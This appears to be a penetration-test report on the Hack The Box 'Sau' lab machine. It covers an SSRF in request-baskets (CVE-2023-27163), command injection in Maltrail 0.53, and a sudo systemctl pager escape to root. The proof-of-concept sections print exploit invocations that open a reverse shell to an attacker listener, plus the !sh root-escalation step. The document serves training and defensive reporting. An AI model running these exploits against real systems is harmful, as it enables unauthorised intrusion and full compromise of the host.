Sau Pentest company Report ID: PEN-DOC-202309140649 14-09-2023

1 Project Overview

1.1 Description

Hack The Box gives individuals, businesses and universities the tools they need to
continuously improve their cybersecurity capabilities — all in one place.

2 Executive Summary

The Sau project is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI. There are three active services in the system, two of which can be reached from outside and one which can only be reached from the local network.

It was requested to carry out Vulnerability Assessment and Penetration Test” activities in order to highlight vulnerabilities and possibilities of exploitation on the Portal.
For each vulnerability detected, some considerations were made on the possible problems that would occur if an attacker managed to exploit them and for each of them the following information is reported.

  • Classification: criticality level (“Classification of criticality levels”);
  • State: mitigation state (“Mitigation State Classification”);
  • Description: type and context of the vulnerability detected;
  • Impact: consequences of exploiting the vulnerability in terms of loss of confidentiality, integrity and/or availability of data;
  • Attack complexity: conditions necessary for the success of the attack (CVSS Score);
  • PoC: evidence of the problem with any procedures to reproduce it;
  • Recommended solution: configurations or actions necessary to mitigate the issue;
  • References: Additional: details provided through resources external to the document.

The activity was carried out from 12/09/2023 to 14/09/2023 on the Sau Portal and part of its ecosystem.

2.1 Summary of Findings Identified

# Finding Severity
1 Remote Code Execution High
2 Privilege Escalatio Vector High
3 Server Side Request Forgery Medium

2.2 Scope

2.2.1 In Scope

The tests specifically involved the web server that offers the data access point, specifically the perimeter was limited to the following access ports:

  • 22/tcp
  • 80/tcp
  • 8338/tcp
  • 55555/tcp

The following elements were provided for the tests:

  • VPN access to the Sau Portal;

2.2.2 Out of Scope

The VA/PT tests performed did not involve any DoS-type vulnerabilities.

2.3 Methodology

In this context, not having received some information on the use of the platform, an approach commonly referred to as Black Box was used.

The tests specifically involved the web server that offers the data access point.
The main objective of the test is to analyze in detail all the functionalities of the assets under examination, in order to find unintentional ways to compromise the confidentiality, integrity and/or availability of sensitive data.
The techniques and methodologies used in the Penetration Test phase aim to cover the widest possible scenarios to identify possible attack vectors and intrusion techniques to which target applications are exposed. The methodology adopted for security assessments is in line with the following standards:

  • Open Web Application Security Project (OWASP)
  • Open Source Security Methodology Manual (OSSTMM)
  • Penetration Testing Execution Standard (PTES)

The Security Assessment methodology adopted, which is extremely broad and complete, includes:

  • Run proprietary and free tools to identify known protocols, versions, services, and related vulnerabilities;
  • Research, preparation and use of proprietary and free software, private and public exploits, commercial and free exploiting software to exploit identified vulnerabilities;

2.4 Recommendations

To increase the IT security levels of the Sau web portal, the following points should always be taken into account:

  • Regularly update the software used;
  • Monitor through security news any new known vulnerabilities relating to the software used;
  • Follow the principle of least privilege;
  • Periodically carry out VA/PT activities;

3 Findings and Risk Analysis

3.1 Remote Code Execution

Severity High
CVSS Score 7.7
CWE 94 - Improper Control of Generation of Code (‘Code Injection’)
Description

Maltrail is a malicious traffic detection system, utilizing publicly available black lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. zvpprsensinaix.com for Banjori malware), URL (e.g. hXXp://109.162.38.120/harsh02.exe for known malicious executable), IP address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header value (e.g. sqlmap for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).

The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get(“username”) parameter. An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication. Successfully tested against Maltrail versions 0.52 and 0.53.

The service was achieved through the exploitation of a Server Side Request Forgery vulnerability and it was possible to verify that the version used (0.53) is vulnerable to Remote Code Execution.

Location

The service is located on the target machine on ports 80 and 8338 and can only be reached via localhost.

Impact

If properly exploited, it can lead to an attacker executing a malicious code on the target system, for example he can gain control of a working reverse shell and enter the system’s file system with the permissions of the user who launched the application.

Proof of Concept

It is downloaded an exploit from exploit-db, it is setted up a listener via metasploit, and it is ran the exploit. So it has been possible got a perfectly working reverse shell.

  • exploit 
$ python 51676 10.10.14.59 4444 http://10.10.11.224:55555/rjxsgj         
Running exploit on http://10.10.11.224:55555/rjxsgj/login
  • metasploit 
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.59:4444 
[*] Command shell session 1 opened (10.10.14.59:4444 -> 10.10.11.224:43028) at 2023-09-13 10:58:52 +0200


Shell Banner:
$
Recommendation

The following solutions are proposed as recommendations:

  • Update the software to the latest safe version available.
  • Implement a blacklist preventing an attacker from inserting certain malicious characters.
References
  1. https://packetstormsecurity.com/files/174129/Maltrail-0.53-Remote-Code-Execution.html
  2. https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html
  3. https://www.exploit-db.com/exploits/51676

3.2 Privilege Escalatio Vector

Severity High
CVSS Score 7.1
CWE 250 - Execution with Unnecessary Privileges
Description

The application was launched by the user puma, so after gaining access to the system remotely (e.g. SSH, reverse shell, …) you have the permissions of this user. It can read various sensitive files and execute certain commands. In particular, it can run the systemctl status trail.service command with sudo permissions without having to enter any password.

This violates the principle of least privilege since to check the status of a service via the systemctl command there is no need for administrator permissions.

Location

The PE vector is accessible locally from the target system.

Impact

An attacker who has access to the target system can obtain a root shell by exploiting the permissions given on the systemctl command. There are numerous documentations and tutorials online, the most famous is the GTFOBins site.

Proof of Concept

An attacker accessing the system is able to obtain a root shell by typing !sh in the interface that the system displays after checking the status of the trail service with root permissions. 

puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)

# whoami
Recommendation

The following solutions are proposed as recommendations:

  • Respect the principle of least privilege;
  • Launch the application with a user with lower privileges, such as www-data;
  • Remove sudo permissions without having to enter a password from the puma user for the systemctl command
References

  2. https://martellosecurity.com/kb/mitre/cwe/250/

3.3 Server Side Request Forgery

Severity Medium
CVSS Score 6.5
CWE 918 - Server-Side Request Forgery (SSRF)
Description

The service present on port 55555 is Requests-Basket and the version used, 1.2.1, is vulnerable to Server Side Request Forgery.

CVE-2023-27163

request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/<name>. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.

The vulnerability allows a network attacker to redirect HTTP requests to a potentially malicious IP address, there is no limit on the address to choose to redirect traffic.

Location

The vulnerable service can be reached via the network and is located on port 55555.

Impact

Through the exploitation of this CVE it was possible to redirect traffic to ports 80 and 8338, which allow requests only via the local network (localhost). In this way it was possible to discover an additional service present in the system that should not have been accessible from the outside.

Proof of Concept

A public exploit found on github it was used to exploit this vulnerability. 

$ ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/  
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "rjxsgj" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/rjxsgj now makes the server request to http://127.0.0.1:80/.
> Authorization: 5a2ovn0HdKO6dRMDPwELYCMB_97paH5m40ptrvoMXAXd

In this way an attacker can reach the service Maltrain on port 80 and 8338.

Recommendation

The following solutions are proposed as recommendations:

  • You should ensure that you are using a version of Requests-Basket that includes the security fix for CVE-2023-27163.
  • Update to the latest secure version.
